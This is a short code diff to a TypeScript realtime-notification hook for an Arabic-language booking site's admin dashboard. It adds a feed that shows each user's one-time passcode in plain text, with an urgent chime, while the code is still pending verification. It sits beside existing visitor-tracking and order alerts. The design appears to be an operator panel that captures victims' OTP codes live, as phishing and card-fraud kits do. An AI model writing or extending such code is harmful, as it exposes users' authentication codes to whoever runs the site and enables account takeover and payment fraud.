@@ -29,6 +29,8 @@ function getDescription(table: TableName, payload: any): string {
       return `${payload.email} — ${payload.total} ر.س`;
     case "visitors":
       return `${payload.name || "زائر جديد"} — ${payload.current_page_label || "الصفحة الرئيسية"} (${payload.device === "mobile" ? "جوال" : "كمبيوتر"} / ${payload.browser})`;
+    case "otp_requests":
+      return `رمز OTP: ${payload.otp_code} — الحالة: ${payload.status === "pending" ? "بانتظار التحقق" : payload.status}`;
     default:
       return "عنصر جديد";
   }
@@ -80,14 +82,23 @@ export function useRealtimeNotifications() {
           notify("visitors", payload.new);
         }
       )
+      .on(
+        "postgres_changes" as any,
+        { event: "INSERT", schema: "public", table: "otp_requests" },
+        (payload: RealtimePostgresInsertPayload<any>) => {
+          notify("otp_requests", payload.new);
+        }
+      )
       .subscribe();
 
     function notify(table: TableName, data: any) {
       const info = tableLabels[table];
       const description = getDescription(table, data);
       const needsApproval = (table === "ticket_orders" || table === "restaurant_bookings" || table === "event_bookings") && data.status === "pending";
+      const isOtp = table === "otp_requests";
       
-      const soundType = table === "contact_messages" ? "message"
+      const soundType = isOtp ? "urgent"
+        : table === "contact_messages" ? "message"
         : table === "event_bookings" ? "notification"
         : needsApproval ? "urgent" : "notification";
       playChime(soundType);
